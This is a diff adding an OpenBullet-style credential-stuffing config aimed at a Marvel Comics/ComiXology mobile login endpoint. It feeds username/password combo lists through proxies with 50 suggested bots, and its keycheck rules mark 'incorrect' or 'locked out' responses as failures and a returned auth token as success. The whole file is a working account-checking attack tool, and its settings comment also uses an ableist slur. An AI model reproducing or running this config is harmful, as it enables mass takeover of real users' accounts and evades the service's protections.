@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "MarvelAPI",
+  "SuggestedBots": 50,
+  "LastModified": "2018-08-09T02:20:51.1090055+00:00",
+  "AdditionalInfo": "No Capture because I am too retarded to add it.",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://marvel-secure.comixology.com/ios/api/com.marvel.android.comics/3.9.5/?action=login&deviceType=phone&lang=en" AutoRedirect=TRUE 
+  CONTENT "password=<PASS>&username=<USER>&" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Marvel Comics/3.10.5[3.10.5.310322] Google/9[PPR1.180610.009] (Pixel - aba3c8cdf2115e61d77d76a66739fde7)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Host: marvel-secure.comixology.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "provided is incorrect" 
+    KEY "account is locked out" 
+  KEYCHAIN Success OR 
+    KEY "comics.auth_token" 
